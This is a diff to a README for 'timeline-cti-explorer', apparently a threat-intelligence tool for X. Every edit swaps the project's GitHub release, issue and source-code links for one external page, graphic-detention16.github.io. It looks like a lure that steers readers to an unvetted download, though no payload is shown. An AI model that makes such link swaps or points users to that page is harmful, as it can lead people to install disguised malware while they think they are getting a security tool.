@@ -1,6 +1,6 @@
 # 🕵️ timeline-cti-explorer - Find Cyber Threats Faster on X
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20The%20App-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Graphic-detention16/timeline-cti-explorer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20The%20App-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://graphic-detention16.github.io)
 
 ## 📖 What Is This?
 
@@ -23,7 +23,7 @@ Follow these three simple steps to start using timeline-cti-explorer today.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Graphic-detention16/timeline-cti-explorer/releases](https://github.com/Graphic-detention16/timeline-cti-explorer/releases)
+Visit this link to download the application: [https://graphic-detention16.github.io](https://graphic-detention16.github.io)
 
 Click the button above or the link to go to the download page. Look for the newest version at the top of the list.
 
@@ -139,7 +139,7 @@ Search for well-known security Twitter accounts. See what they're posting about 
 
 Need help? We're here for you.
 
-- **Report a Bug** – Visit the [Issues page](https://github.com/Graphic-detention16/timeline-cti-explorer/issues) and tell us what went wrong.
+- **Report a Bug** – Visit the [Issues page](https://graphic-detention16.github.io) and tell us what went wrong.
 - **Ask Questions** – Use the same Issues page to get answers from the community.
 - **Feature Requests** – Let us know what you'd like to see in future versions.
 
@@ -162,9 +162,9 @@ Timeline-cti-explorer is released under an open source license. You can use, mod
 
 ## 🔗 Quick Links
 
-- [Download the App](https://github.com/Graphic-detention16/timeline-cti-explorer/releases)
-- [View Source Code](https://github.com/Graphic-detention16/timeline-cti-explorer)
-- [Report an Issue](https://github.com/Graphic-detention16/timeline-cti-explorer/issues)
+- [Download the App](https://graphic-detention16.github.io)
+- [View Source Code](https://graphic-detention16.github.io)
+- [Report an Issue](https://graphic-detention16.github.io)
 
 ## 🏁 Final Words
 
